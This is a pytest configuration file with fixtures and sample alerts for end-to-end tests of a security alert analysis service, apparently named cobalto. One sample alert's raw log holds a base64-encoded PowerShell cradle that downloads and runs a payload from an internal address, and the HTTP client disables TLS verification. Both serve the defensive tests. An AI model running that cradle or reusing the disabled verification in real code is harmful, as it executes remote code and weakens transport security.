"""
E2E Test Configuration

Shared fixtures for end-to-end tests against a deployed cobalto instance.
Tests discover the target URL from env vars: COBALTO_E2E_URL (default http://localhost:8000).

Usage:
    pytest tests/e2e/ -v
    COBALTO_E2E_URL=https://staging.cobalto.ai pytest tests/e2e/ -v
    pytest tests/e2e/ -k "high_severity" -v
"""

import os
import time
import json
import pytest
import httpx
from typing import Generator

# ── Configuration ────────────────────────────────────────────────────

E2E_URL = os.getenv("COBALTO_E2E_URL", "http://localhost:8000").rstrip("/")
AUTH_URL = os.getenv("COBALTO_AUTH_URL", f"{E2E_URL}/api/auth").rstrip("/")
API_URL = f"{E2E_URL}/agent"

E2E_USERNAME = os.getenv("COBALTO_E2E_USER", "testadmin")
E2E_PASSWORD = os.getenv("COBALTO_E2E_PASS", "")
E2E_API_KEY = os.getenv("COBALTO_E2E_API_KEY", "")


# ── Test Data ────────────────────────────────────────────────────────

CREDENTIAL_ACCESS_ALERT = {
    "alert_id": "E2E-TA0006-001",
    "rule_id": 800100,
    "rule_description": "Credential access via suspicious PS exec",
    "alert_level": 3,
    "source_ip": "10.0.0.50",
    "dest_ip": "10.0.0.10",
    "agent_name": "dc-01",
    "timestamp": "2026-07-06T08:00:00Z",
    "raw_log": (
        "EventID: 4688 - A new process has been created. "
        "Credential: Taskmgr.exe with commandline: "
        "\"powershell -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1ADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAKQA='\" "
        "from source 10.0.0.50 targeting DC-01. Lateral movement detected."
    ),
}

LATERAL_MOVEMENT_ALERT = {
    "alert_id": "E2E-TA0008-001",
    "rule_id": 800200,
    "rule_description": "Lateral movement via RDP from non-admin workstation",
    "alert_level": 4,
    "source_ip": "192.168.1.100",
    "dest_ip": "192.168.1.200",
    "agent_name": "srv-db-01",
    "timestamp": "2026-07-06T08:05:00Z",
    "raw_log": (
        "EventID: 4625 - An account failed to log on. "
        "Subject: Security ID: S-1-0-0, Account Name: ANONYMOUS LOGON "
        "Logon Type: 3 (Network). Source Network Address: 192.168.1.100. "
        "This host normally does not initiate RDP connections. "
        "Possible lateral movement from compromised workstation. "
        "Exfiltration of database backups was observed on the wire."
    ),
}

LOW_SEVERITY_ALERT = {
    "alert_id": "E2E-LOW-001",
    "rule_id": 100100,
    "rule_description": "Scheduled task created by authorized user",
    "alert_level": 1,
    "source_ip": "10.0.0.5",
    "dest_ip": None,
    "agent_name": "srv-app-01",
    "timestamp": "2026-07-06T06:00:00Z",
    "raw_log": (
        "Task Scheduler successfully created task \"WindowsUpdate-AD-Group-Policy\" "
        "on SRV-APP-01 by NT AUTHORITY\\SYSTEM. This is a known maintenance task. "
        "false positive - scheduled vulnerability scan."
    ),
}


# ── Fixtures ─────────────────────────────────────────────────────────

@pytest.fixture(scope="session")
def http_client() -> Generator[httpx.Client, None, None]:
    """Shared HTTPX client with reasonable timeouts and base URL."""
    with httpx.Client(base_url=E2E_URL, timeout=30.0, verify=False) as client:
        yield client


@pytest.fixture(scope="session")
def auth_token(http_client: httpx.Client) -> str:
    """
    Obtain a JWT access token via the auth service.

    Skips auth if COBALTO_E2E_API_KEY is set (API key mode).
    """
    if E2E_API_KEY:
        return E2E_API_KEY

    if not E2E_PASSWORD:
        pytest.skip(
            "E2E auth requires COBALTO_E2E_PASS env var "
            "(or COBALTO_E2E_API_KEY for API key mode)"
        )

    resp = http_client.post(
        f"{AUTH_URL}/login",
        json={"username": E2E_USERNAME, "password": E2E_PASSWORD},
    )
    if resp.status_code == 404:
        pytest.skip("Auth service not available at " + AUTH_URL)

    assert resp.status_code == 200, (
        f"Auth login failed ({resp.status_code}): {resp.text}"
    )
    data = resp.json()
    return data["access_token"]


@pytest.fixture
def auth_headers(auth_token: str) -> dict:
    """Headers with Bearer token for protected API calls."""
    headers = {
        "Content-Type": "application/json",
    }
    if E2E_API_KEY:
        headers["X-API-Key"] = auth_token
    else:
        headers["Authorization"] = f"Bearer {auth_token}"
    return headers


@pytest.fixture
def credential_alert() -> dict:
    """A HIGH-severity credential access alert that triggers full pipeline."""
    return dict(CREDENTIAL_ACCESS_ALERT)


@pytest.fixture
def lateral_movement_alert() -> dict:
    """A CRITICAL-severity lateral movement alert."""
    return dict(LATERAL_MOVEMENT_ALERT)


@pytest.fixture
def low_severity_alert() -> dict:
    """A LOW-severity alert that auto-resolves."""
    return dict(LOW_SEVERITY_ALERT)


# ── Helpers ──────────────────────────────────────────────────────────

def analyze_alert(
    client: httpx.Client,
    headers: dict,
    payload: dict,
    expected_status: int = 200,
) -> dict:
    """POST /agent/analyze and return parsed response. Asserts status."""
    url = f"{API_URL}/analyze"
    resp = client.post(url, json=payload, headers=headers)
    assert resp.status_code == expected_status, (
        f"POST {url} returned {resp.status_code}: {resp.text[:500]}"
    )
    return resp.json()


def wait_for_condition(
    condition_fn,
    timeout: float = 30.0,
    interval: float = 1.0,
    description: str = "condition",
) -> bool:
    """Poll until condition_fn() returns truthy, or timeout."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        result = condition_fn()
        if result:
            return True
        time.sleep(interval)
    pytest.fail(f"Timeout waiting for {description}")
